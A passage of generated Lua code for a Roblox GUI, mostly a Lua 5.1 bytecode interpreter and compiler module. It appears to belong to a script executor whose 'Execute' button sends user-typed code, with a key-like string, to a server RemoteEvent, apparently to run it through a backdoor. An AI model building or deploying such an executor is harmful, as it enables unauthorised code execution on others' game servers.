  assert(luaP:getOpMode(o) == luaP.OpMode.iABx or
             luaP:getOpMode(o) == luaP.OpMode.iAsBx)
  assert(luaP:getCMode(o) == luaP.OpArgMask.OpArgN)
  return self:code(fs, luaP:CREATE_ABx(o, a, bc), fs.ls.lastline)
end

------------------------------------------------------------------------
--
-- * used in (lparser) luaY:closelistfield(), luaY:lastlistfield()
------------------------------------------------------------------------
function luaK:setlist(fs, base, nelems, tostore)
  local c = math.floor((nelems - 1)/luaP.LFIELDS_PER_FLUSH) + 1
  local b = (tostore == luaY.LUA_MULTRET) and 0 or tostore
  assert(tostore ~= 0)
  if c <= luaP.MAXARG_C then
    self:codeABC(fs, "OP_SETLIST", base, b, c)
  else
    self:codeABC(fs, "OP_SETLIST", base, b, 0)
    self:code(fs, luaP:CREATE_Inst(c), fs.ls.lastline)
  end
  fs.freereg = base + 1  -- free registers with list values
end

return function(a) luaY = a return luaK end
end
}
--verified.Frame.ImageLabel.Page 3.Execute.yes'.Script.Loadstring.LBI
G2L_MODULES[G2L["404"]] = {
Closure = function()
local script = G2L["404"]
local advanced_debug

local lua_opcode_types = {
	"ABC",  "ABx", "ABC",  "ABC",
	"ABC",  "ABx", "ABC",  "ABx", 
	"ABC",  "ABC", "ABC",  "ABC",
	"ABC",  "ABC", "ABC",  "ABC",
	"ABC",  "ABC", "ABC",  "ABC",
	"ABC",  "ABC", "AsBx", "ABC",
	"ABC",  "ABC", "ABC",  "ABC",
	"ABC",  "ABC", "ABC",  "AsBx",
	"AsBx", "ABC", "ABC", "ABC",
	"ABx",  "ABC",
}

local lua_opcode_names = {
	"MOVE",     "LOADK",     "LOADBOOL", "LOADNIL",
	"GETUPVAL", "GETGLOBAL", "GETTABLE", "SETGLOBAL",
	"SETUPVAL", "SETTABLE",  "NEWTABLE", "SELF",
	"ADD",      "SUB",       "MUL",      "DIV",
	"MOD",      "POW",       "UNM",      "NOT",
	"LEN",      "CONCAT",    "JMP",      "EQ",
	"LT",       "LE",        "TEST",     "TESTSET",
	"CALL",     "TAILCALL",  "RETURN",   "FORLOOP",
	"FORPREP",  "TFORLOOP",  "SETLIST",  "CLOSE",
	"CLOSURE",  "VARARG"
};

--[[
local lua_opcode_numbers = {};
for number, name in next, lua_opcode_names do
	lua_opcode_numbers[name] = number;
end
--]]

--- Extract bits from an integer
--@author: Stravant
local function get_bits(input, n, n2)
	if n2 then
		local total = 0
		local digitn = 0
		for i = n, n2 do
			total = total + 2^digitn*get_bits(input, i)
			digitn = digitn + 1
		end
		return total
	else
		local pn = 2^(n-1)
		return (input % (pn + pn) >= pn) and 1 or 0
	end
end

local function decode_bytecode(bytecode)
	local index = 1
	local big_endian = false
    local int_size;
    local size_t;

    -- Actual binary decoding functions. Dependant on the bytecode.
    local get_int, get_size_t;

	-- Binary decoding helper functions
	local get_int8, get_int32, get_int64, get_float64, get_string;
	do
		function get_int8()
			local a = bytecode:byte(index, index);
			index = index + 1
			return a
		end
		function get_int32()
            local a, b, c, d = bytecode:byte(index, index + 3);
            index = index + 4;
            return d*16777216 + c*65536 + b*256 + a
        end
        function get_int64()
            local a = get_int32();
            local b = get_int32();
            return b*4294967296 + a;
        end
		function get_float64()
			local a = get_int32()
			local b = get_int32()
			return (-2*get_bits(b, 32)+1)*(2^(get_bits(b, 21, 31)-1023))*
			       ((get_bits(b, 1, 20)*(2^32) + a)/(2^52)+1)
		end
		function get_string(len)
			local str;
            if len then
	            str = bytecode:sub(index, index + len - 1);
	            index = index + len;
            else
                len = get_size_t();
	            if len == 0 then return; end
	            str = bytecode:sub(index, index + len - 1);
	            index = index + len;
            end
            return str;
        end
	end

	local function decode_chunk()
		local chunk;
		local instructions = {};
		local constants    = {};
		local prototypes   = {};
		local debug = {
			lines = {};
		};

		chunk = {
			instructions = instructions;
			constants    = constants;
			prototypes   = prototypes;
			debug = debug;
		};

		local num;

		chunk.name       = get_string();-- Function name
		chunk.first_line = get_int();	-- First line
		chunk.last_line  = get_int();	-- Last  line

        if chunk.name then chunk.name = chunk.name:sub(1, -2); end
		
		chunk.upvalues  = get_int8();
		chunk.arguments = get_int8();
		chunk.varg      = get_int8();
		chunk.stack     = get_int8();

        -- TODO: realign lists to 1
		-- Decode instructions
		do
			num = get_int();
			for i = 1, num do
				local instruction = {
					-- opcode = opcode number;
					-- type   = [ABC, ABx, AsBx]
					-- A, B, C, Bx, or sBx depending on type
				};

				local data   = get_int32();
				local opcode = get_bits(data, 1, 6);
				local type   = lua_opcode_types[opcode + 1];

				instruction.opcode = opcode;
				instruction.type   = type;
				
				instruction.A = get_bits(data, 7, 14);
				if type == "ABC" then
					instruction.B = get_bits(data, 24, 32);
					instruction.C = get_bits(data, 15, 23);
				elseif type == "ABx" then
					instruction.Bx = get_bits(data, 15, 32);
				elseif type == "AsBx" then
					instruction.sBx = get_bits(data, 15, 32) - 131071;
				end

				instructions[i] = instruction;
			end
		end

		-- Decode constants
		do
			num = get_int();
			for i = 1, num do
				local constant = {
					-- type = constant type;
					-- data = constant data;
				};
				local type = get_int8();
				constant.type = type;

				if type == 1 then
					constant.data = (get_int8() ~= 0);
				elseif type == 3 then
					constant.data = get_float64();
				elseif type == 4 then
					constant.data = get_string():sub(1, -2);
				end

				constants[i-1] = constant;
			end
		end

		-- Decode Prototypes
		do
			num = get_int();
			for i = 1, num do
				prototypes[i-1] = decode_chunk();
			end
		end

		-- Decode debug info
        -- Not all of which is used yet.
		do
			-- line numbers
			local data = debug.lines
			num = get_int();
			for i = 1, num do
				data[i] = get_int32();
			end

			-- locals
			num = get_int();
			for i = 1, num do
				get_string():sub(1, -2);	-- local name
				get_int32();	-- local start PC
				get_int32();	-- local end   PC
			end

			-- upvalues
			num = get_int();
			for i = 1, num do
				get_string();	-- upvalue name
			end
		end

		return chunk;
	end

	-- Verify bytecode header
	do
		assert(get_string(4) == "\27Lua", "Lua bytecode expected.");
		assert(get_int8() == 0x51, "Only Lua 5.1 is supported.");
		get_int8(); 	-- Oficial bytecode
		big_endian = (get_int8() == 0);
        int_size = get_int8();
        size_t   = get_int8();

        if int_size == 4 then
            get_int = get_int32;
        elseif int_size == 8 then
            get_int = get_int64;
        else
	        -- TODO: refactor errors into table
            error("Unsupported bytecode target platform");
        end

        if size_t == 4 then
            get_size_t = get_int32;
        elseif size_t == 8 then
            get_size_t = get_int64;
        else
            error("Unsupported bytecode target platform");
        end

        assert(get_string(3) == "\4\8\0",
	           "Unsupported bytecode target platform");
	end

	return decode_chunk();
end

local function handle_return(...)
	local c = select("#", ...)
	local t = {...}
	return c, t
end

local function create_wrapper(cache, upvalues)
	local instructions = cache.instructions;
	local constants    = cache.constants;
	local prototypes   = cache.prototypes;
	
	local stack, top
	local environment
	local IP = 1;	-- instruction pointer
	local vararg, vararg_size 

	local opcode_funcs = {
		[0]  = function(instruction)	-- MOVE
			stack[instruction.A] = stack[instruction.B];
		end,
		[1]  = function(instruction)	-- LOADK
			stack[instruction.A] = constants[instruction.Bx].data;
		end,
		[2]  = function(instruction)	-- LOADBOOL
			stack[instruction.A] = instruction.B ~= 0
			if instruction.C ~= 0 then
				IP = IP + 1
			end
		end,
		[3]  = function(instruction)	-- LOADNIL
			local stack = stack
			for i = instruction.A, instruction.B do
				stack[i] = nil
			end
		end,
		[4] = function(instruction)		-- GETUPVAL
			stack[instruction.A] = upvalues[instruction.B]
		end,
		[5]  = function(instruction)	-- GETGLOBAL
			local key = constants[instruction.Bx].data;
			stack[instruction.A] = environment[key];
		end,
		[6]  = function(instruction)	-- GETTABLE
			local C = instruction.C
			local stack = stack
			C = C > 255 and constants[C-256].data or stack[C]
			stack[instruction.A] = stack[instruction.B][C];
		end,
		[7]  = function(instruction)	-- SETGLOBAL
			local key = constants[instruction.Bx].data;
			environment[key] = stack[instruction.A];
		end,
		[8] = function (instruction)	-- SETUPVAL
			upvalues[instruction.B] = stack[instruction.A]
		end,
		[9] = function (instruction)	-- SETTABLE
			local B = instruction.B;
			local C = instruction.C;
			local stack, constants = stack, constants;
			
			B = B > 255 and constants[B-256].data or stack[B];
			C = C > 255 and constants[C-256].data or stack[C];
			
			stack[instruction.A][B] = C
		end,
		[10] = function (instruction)	-- NEWTABLE
			stack[instruction.A] = {}
		end,
		[11] = function (instruction)	-- SELF
			local A = instruction.A
			local B = instruction.B
			local C = instruction.C
			local stack = stack
			
			B = stack[B]
			C = C > 255 and constants[C-256].data or stack[C]
			
			stack[A+1] = B
			stack[A]   = B[C]
		end,
		[12] = function(instruction)	-- ADD
			local B = instruction.B;
			local C = instruction.C;
			local stack, constants = stack, constants;
			
			B = B > 255 and constants[B-256].data or stack[B];
			C = C > 255 and constants[C-256].data or stack[C];
			
			stack[instruction.A] = B+C;
		end,
		[13] = function(instruction)	-- SUB
			local B = instruction.B;
			local C = instruction.C;
			local stack, constants = stack, constants;
			
			B = B > 255 and constants[B-256].data or stack[B];
			C = C > 255 and constants[C-256].data or stack[C];
			
			stack[instruction.A] = B - C;	
		end,
		[14] = function(instruction)	-- MUL
			local B = instruction.B;
			local C = instruction.C;
			local stack, constants = stack, constants;
			
			B = B > 255 and constants[B-256].data or stack[B];
			C = C > 255 and constants[C-256].data or stack[C];
			
			stack[instruction.A] = B * C;
		end,
		[15] = function(instruction)	--DIV
			local B = instruction.B;
			local C = instruction.C;
			local stack, constants = stack, constants;
			
			B = B > 255 and constants[B-256].data or stack[B];
			C = C > 255 and constants[C-256].data or stack[C];
			
			stack[instruction.A] = B / C;
		end,
		[16] = function(instruction) 	-- MOD
			local B = instruction.B;
			local C = instruction.C;
			local stack, constants = stack, constants;
			
			B = B > 255 and constants[B-256].data or stack[B];
			C = C > 255 and constants[C-256].data or stack[C];
			
			stack[instruction.A] = B % C;		
		end,
		[17] = function(instruction)	-- POW
			local B = instruction.B;
			local C = instruction.C;
			local stack, constants = stack, constants;
			
			B = B > 255 and constants[B-256].data or stack[B];
			C = C > 255 and constants[C-256].data or stack[C];
			
			stack[instruction.A] = B ^ C;		
		end,
		[18] = function(instruction)	-- UNM
			stack[instruction.A] = -stack[instruction.B]
		end,
		[19] = function(instruction)	-- NOT
			stack[instruction.A] = not stack[instruction.B]
		end,
		[20] = function(instruction)	-- LEN
			stack[instruction.A] = #stack[instruction.B]
		end,
		[21] = function(instruction)	-- CONCAT
			local B = instruction.B
			local result = stack[B]
			for i = B+1, instruction.C do
				result = result .. stack[i] 
			end
			stack[instruction.A] = result
		end,
		[22] = function(instruction)	-- JUMP
			IP = IP + instruction.sBx
		end,
		[23] = function(instruction)	-- EQ
			local A = instruction.A
			local B = instruction.B
			local C = instruction.C
			local stack, constants = stack, constants
			
			A = A ~= 0
			B = B > 255 and constants[B-256].data or stack[B]
			C = C > 255 and constants[C-256].data or stack[C]
			if (B == C) ~= A then
				IP = IP + 1
			end
		end,
		[24] = function(instruction)	-- LT
			local A = instruction.A
			local B = instruction.B
			local C = instruction.C
			local stack, constants = stack, constants
			
			A = A ~= 0
			B = B > 255 and constants[B-256].data or stack[B]
			C = C > 255 and constants[C-256].data or stack[C]
			if (B < C) ~= A then
				IP = IP + 1
			end		
		end,
		[25] = function(instruction)	-- LT
			local A = instruction.A
			local B = instruction.B
			local C = instruction.C
			local stack, constants = stack, constants
			
			A = A ~= 0
			B = B > 255 and constants[B-256].data or stack[B]
			C = C > 255 and constants[C-256].data or stack[C]
			if (B <= C) ~= A then
				IP = IP + 1
			end		
		end,
		[26] = function(instruction)	-- TEST
			if (not not stack[instruction.A]) == (instruction.C == 0) then
				IP = IP + 1
			end
		end,
		[27] = function(instruction)	-- TESTSET
			local stack = stack
			local B = stack[instruction.B]
			if (not not B) == (instruction.C == 0) then
				IP = IP + 1
			else
				stack[instruction.A] = B
			end
		end,
		[28] = function(instruction)	-- CALL
			local A = instruction.A;
			local B = instruction.B;
			local C = instruction.C;
			local stack = stack;
			local args, results;
			local limit, loop
			
			args = {};
			if B ~= 1 then
				if B ~= 0 then
					limit = A+B-1;
				else
					limit = top
				end
				
				loop = 0
				for i = A+1, limit do
					loop = loop + 1
					args[loop] = stack[i];
				end
				
				limit, results = handle_return(stack[A](unpack(args, 1, limit-A)))
			else
				limit, results = handle_return(stack[A]())
			end
			
			top = A - 1
		
			if C ~= 1 then
				if C ~= 0 then
					limit = A+C-2;
				else
					limit = limit+A
				end
				
				loop = 0;
				for i = A, limit do
					loop = loop + 1;
					stack[i] = results[loop];
				end
			end
		end,
		[29] = function (instruction)	-- TAILCALL
			local A = instruction.A;
			local B = instruction.B;
			local C = instruction.C;
			local stack = stack;
			local args, results;
			local top, limit, loop = top
			
			args = {};
			if B ~= 1 then
				if B ~= 0 then
					limit = A+B-1;
				else
					limit = top
				end
				
				loop = 0
				for i = A+1, limit do
					loop = loop + 1
					args[#args+1] = stack[i];
				end
				
				results = {stack[A](unpack(args, 1, limit-A))};
			else
				results = {stack[A]()};
			end
			
			return true, results
		end,
		[30] = function(instruction) -- RETURN
			--TODO: CLOSE
			local A = instruction.A;
			local B = instruction.B;
			local stack = stack;
			local limit;
			local loop, output;
						
			if B == 1 then
				return true;
			end
			if B == 0 then
				limit = top
			else
				limit = A + B - 2;
			end
			
			output = {};
			local loop = 0
			for i = A, limit do
				loop = loop + 1
				output[loop] = stack[i];
			end
			return true, output;
		end,
		[31] = function(instruction)	-- FORLOOP
			local A = instruction.A
			local stack = stack
			
			local step = stack[A+2]
			local index = stack[A] + step 
			stack[A] = index
			
			if step > 0 then
				if index <= stack[A+1] then
					IP = IP + instruction.sBx
					stack[A+3] = index
				end
			else
				if index >= stack[A+1] then
					IP = IP + instruction.sBx
					stack[A+3] = index
				end
			end
		end,
		[32] = function(instruction)	-- FORPREP
			local A = instruction.A
			local stack = stack
			
			stack[A] = stack[A] - stack[A+2]
			IP = IP + instruction.sBx 
		end,
		[33] = function(instruction)	-- TFORLOOP
			local A = instruction.A
			local B = instruction.B
			local C = instruction.C
			local stack = stack
			
			local offset = A+2
			local result = {stack[A](stack[A+1], stack[A+2])}
			for i = 1, C do
				stack[offset+i] = result[i]
			end
			
			if stack[A+3] ~= nil then
				stack[A+2] = stack[A+3]
			else
				IP = IP + 1
			end
		end,
		[34] = function(instruction)	-- SETLIST
			local A = instruction.A
			local B = instruction.B
			local C = instruction.C
			local stack = stack

			if C == 0 then
				error("NYI: extended SETLIST")
			else
				local offset = (C - 1) * 50
				local t = stack[A]
				
				if B == 0 then
					B = top
				end
				for i = 1, B do
					t[offset+i] = stack[A+i]	
				end				
			end
		end,
		[35] = function(instruction)	-- CLOSE
			--io.stderr:write("NYI: CLOSE")
			--io.stderr:flush()
		end,
		[36] = function(instruction)	-- CLOSURE
			local proto = prototypes[instruction.Bx]
			local instructions = instructions
			local stack = stack
			
			local indices = {}
			local new_upvals = setmetatable({},
				{
					__index = function(t, k)
						local upval = indices[k]
						return upval.segment[upval.offset]
					end,
					__newindex = function(t, k, v)
						local upval = indices[k]
						upval.segment[upval.offset] = v
					end
				}
			)
			for i = 1, proto.upvalues do
				local movement = instructions[IP]
				if movement.opcode == 0 then -- MOVE
					indices[i-1] = {segment = stack, offset = movement.B}
				elseif instructions[IP].opcode == 4 then -- GETUPVAL
					indices[i-1] = {segment = upvalues, offset = movement.B}
				end
				IP = IP + 1
			end
			
			local _, func = create_wrapper(proto, new_upvals)
			stack[instruction.A] = func
		end,
		[37] = function(instruction)	-- VARARG
			local A = instruction.A
			local B = instruction.B
			local stack, vararg = stack, vararg
			
			for i = A, A + (B > 0 and B - 1 or vararg_size) do
				stack[i] = vararg[i - A]
			end
		end,
	}
	
	local function loop()
		local instructions = instructions
		local instruction, a, b
		
		while true do
			instruction = instructions[IP];
			IP = IP + 1
			a, b = opcode_funcs[instruction.opcode](instruction);
			if a then
				return b;
			end
		end
	end

	local debugging = {
		get_stack = function()
			return stack;
		end;
		get_IP = function()
			return IP;
		end
	};

	local function func(...)
		local local_stack = {};
		local ghost_stack = {};

		top = -1
		stack = setmetatable(local_stack, {
			__index = ghost_stack;
			__newindex = function(t, k, v)
				if k > top and v then
					top = k
				end
				ghost_stack[k] = v
			end;
		})
		local args = {...};	
		vararg = {}
		vararg_size = select("#", ...) - 1
		for i = 0, vararg_size do
			local_stack[i] = args[i+1];
			vararg[i] = args[i+1]
		end
		
		environment = getfenv();
		IP = 1;
		local thread = coroutine.create(loop)
		local a, b = coroutine.resume(thread)

		if a then
			if b then
				return unpack(b);
			end
			return;
		else
			if advanced_debug then
				--TODO advanced debugging
			else
				--TODO error converting
				local name = cache.name;
				local line = cache.debug.lines[IP];
				local err  = b:gsub("(.-:)", "");
				local output = "";
				
				output = output .. (name and name .. ":" or "");
				output = output .. (line and line .. ":" or "");
				output = output .. b
				--[[
				output = ("%s (Instruction=%s)"):format(output, 
					lua_opcode_names[select(2,debug.getlocal(loop,1, 1)).opcode+1])
				--]]
				error(output, 0);
			end
		end
	end

	return debugging, func;
end

return {
	load_bytecode = function(bytecode,env)
		local cache = decode_bytecode(bytecode);
		local _, func = create_wrapper(cache);
		return func;
	end;

	-- Utilities (Debug, Introspection, Testing, etc)
	utils = {
		decode_bytecode = decode_bytecode;
		create_wrapper = create_wrapper;
		debug_bytecode = function(bytecode)
			local cache = decode_bytecode(bytecode)
			return create_wrapper(cache);
		end;
	};
}
end
}
--verified.Frame.ImageLabel.Page 3.Execute.yes'.Script.LocalScript
local function C_G2L_405()
local script = G2L["405"]
local p = script.Parent.buton.Value
p.MouseButton1Down:Connect(function()
	script.Parent.RemoteEvent:FireServer("Cannot call function Execute() in a tab's folder","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p",script.Parent.text.Value.Text)
end)
end
task.spawn(C_G2L_405)


--verified.Frame.ImageLabel.LocalScript
local function C_G2L_412()
local script = G2L["412"]
local searchBar = script.Parent.search
local scrollFrame = script.Parent.ScrollingCoolThingDonotEditit

function updateSearch()
	while wait(.2) do -- repeats every 0.2 seconds
		for i, button in pairs(scrollFrame:GetChildren()) do -- everything in the scrolling frame
			if button:IsA("TextButton") then -- if its a button
				local searchText = string.lower(searchBar.Text) -- the text in the searchbar
				if searchText ~= "" then -- if the searchbar has text ( is not empty )
					local buttonText = string.lower(button.Text) -- the text of the button (lowercase)
					if string.find(buttonText, searchText) then -- if the button contains the text in the searchbar
						button.Visible = true -- shows the button if it contains search text
					else -- if its not found
						button.Visible = false
					end
				else -- if the text is nothing
					button.Visible = true -- shows all buttons
				end
			end
		end
	end
end

spawn(updateSearch) -- runs our unction in the background
end
task.spawn(C_G2L_412)


--verified.Frame.Open.LocalScript
local function C_G2L_414()
local script = G2L["414"]
local image = script.Parent.Parent.ImageLabel

script.Parent.MouseButton1Click:Connect(function()
	image.Visible = true
end)


end
task.spawn(C_G2L_414)



return G2L["0"], require;
